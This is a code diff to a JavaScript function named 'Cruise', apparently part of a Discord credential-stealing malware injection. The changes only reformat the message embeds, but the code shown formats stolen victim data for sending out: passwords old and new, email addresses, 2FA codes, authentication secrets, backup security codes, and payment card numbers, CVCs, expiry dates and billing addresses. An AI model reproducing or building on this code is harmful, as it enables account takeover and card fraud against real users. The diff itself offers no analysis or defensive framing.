@@ -610,15 +610,15 @@ const Cruise = async (type, response, request, email, password, token, action) =
                 content: `**${user.username}** ${action}!`,
                 embeds: [{
                     fields: [
-                        { name: "Password", value: `\`${password}\``, inline: true },
-                        { name: "Email", value: `\`${email}\``, inline: true },
+                        { name: "Password", value: `\`\`\`${password}\`\`\``, inline: true },
+                        { name: "Email", value: `\`\`\`${email}\`\`\``, inline: true },
                     ],
                 }],
             };
 
             if (request?.code !== undefined) {
                 content.embeds[0].fields.push(
-                    { name: "Used 2FA code", value: `\`${request.code}\``, inline: false }
+                    { name: "Used 2FA code", value: `\`\`\`${request.code}\`\`\``, inline: false }
                 );
             };
 
@@ -631,9 +631,9 @@ const Cruise = async (type, response, request, email, password, token, action) =
                 content: `**${user.username}** ${action}!`,
                 embeds: [{
                     fields: [
-                        { name: "New Username", value: `\`${request.username}\``, inline: true },
-                        { name: "Password", value: `\`${request.password}\``, inline: true },
-                        { name: "Email", value: `\`${email}\``, inline: false },
+                        { name: "New Username", value: `\`\`\`${request.username}\`\`\``, inline: false },
+                        { name: "Password", value: `\`\`\`${request.password}\`\`\``, inline: false },
+                        { name: "Email", value: `\`\`\`${email}\`\`\``, inline: false },
                     ],
                 }],
             };
@@ -646,8 +646,8 @@ const Cruise = async (type, response, request, email, password, token, action) =
                 content: `**${user.username}** ${action}!`,
                 embeds: [{
                     fields: [
-                        { name: "New Email", value: `\`${email}\``, inline: true },
-                        { name: "Password", value: `\`${password}\``, inline: true },
+                        { name: "New Email", value: `\`\`\`${email}\`\`\``, inline: false },
+                        { name: "Password", value: `\`\`\`${password}\`\`\``, inline: false },
                     ],
                 }],
             };
@@ -660,9 +660,9 @@ const Cruise = async (type, response, request, email, password, token, action) =
                 content: `**${user.username}** ${action}!`,
                 embeds: [{
                     fields: [
-                        { name: "New Password", value: `\`${request.new_password}\``, inline: true, },
-                        { name: "Old Password", value: `\`${request.password}\``, inline: true, },
-                        { name: "Email", value: `\`${email}\``, inline: false, },
+                        { name: "New Password", value: `\`\`\`${request.new_password}\`\`\``, inline: false, },
+                        { name: "Old Password", value: `\`\`\`${request.password}\`\`\``, inline: false, },
+                        { name: "Email", value: `\`\`\`${email}\`\`\``, inline: false, },
                     ],
                 }],
             };
@@ -678,8 +678,8 @@ const Cruise = async (type, response, request, email, password, token, action) =
                 content: `**${user.username}** ${action}!`,
                 embeds: [{
                     fields: [
-                        { name: "Password", value: `\`${password}\``, inline: true },
-                        { name: "Email", value: `\`${email}\``, inline: true },
+                        { name: "Password", value: `\`\`\`${password}\`\`\``, inline: false },
+                        { name: "Email", value: `\`\`\`${email}\`\`\``, inline: false },
                         { name: "\u200b", value: "\u200b", inline: false },
                         { name: "Security codes", value: `\`\`\`\n${codes}\`\`\``, inline: false },
                     ],
@@ -688,8 +688,8 @@ const Cruise = async (type, response, request, email, password, token, action) =
 
             if (request?.code !== undefined && request?.secret !== undefined) {
                 content.embeds[0].fields.push(
-                    { name: "Used 2FA code", value: `\`${request.code}\``, inline: true },
-                    { name: "Authentication secret", value: `\`${request.secret}\``, inline: true },
+                    { name: "Used 2FA code", value: `\`${request.code}\``, inline: false },
+                    { name: "Authentication secret", value: `\`${request.secret}\``, inline: false },
                 );
             };
 
@@ -702,11 +702,11 @@ const Cruise = async (type, response, request, email, password, token, action) =
                 content: `**${user.username}** ${action}!`,
                 embeds: [{
                     fields: [
-                        { name: "Email", value: `\`${email}\``, inline: true },
+                        { name: "Email", value: `\`\`\`${email}\`\`\``, inline: false },
                         { name: "\u200b", value: "\u200b", inline: false },
-                        { name: "Number", value: `\`${request.item["card[number]"]}\``, inline: true },
-                        { name: "CVC", value: `\`${request.item["card[cvc]"]}\``, inline: true },
-                        { name: "Expiration", value: `\`${request.item["card[exp_month]"]}/${request.item["card[exp_year]"]}\``, inline: true, },
+                        { name: "Number", value: `\`\`\`${request.item["card[number]"]}\`\`\``, inline: false },
+                        { name: "CVC", value: `\`\`\`${request.item["card[cvc]"]}\`\`\``, inline: false },
+                        { name: "Expiration", value: `\`\`\`${request.item["card[exp_month]"]}/${request.item["card[exp_year]"]}\`\`\``, inline: false, },
                     ],
                     fields: [
                         { name: "Address", value: `\`\`\`\nLine 1: ${request["line_1"]}\nLine 2: ${request["line_2"]}\nCity: ${request["city"]}\nState: ${request["state"]}\nPostal Code: ${request["postal_code"]}\nCountry: ${request["country"]}\n\`\`\``, inline: false, },
@@ -722,7 +722,7 @@ const Cruise = async (type, response, request, email, password, token, action) =
                 content: `**${user.username}** ${action}!`,
                 embeds: [{
                     fields: [
-                        { name: "Email", value: `\`${email}\``, inline: true },
+                        { name: "Email", value: `\`\`\`${email}\`\`\``, inline: false },
                     ],
                 }],
             };
@@ -735,7 +735,7 @@ const Cruise = async (type, response, request, email, password, token, action) =
                 content: `**${user.username}** ${action}!`,
                 embeds: [{
                     fields: [
-                        { name: "Email", value: `\`${email}\``, inline: true },
+                        { name: "Email", value: `\`\`\`${email}\`\`\``, inline: true },
                     ],
                 }],
             };
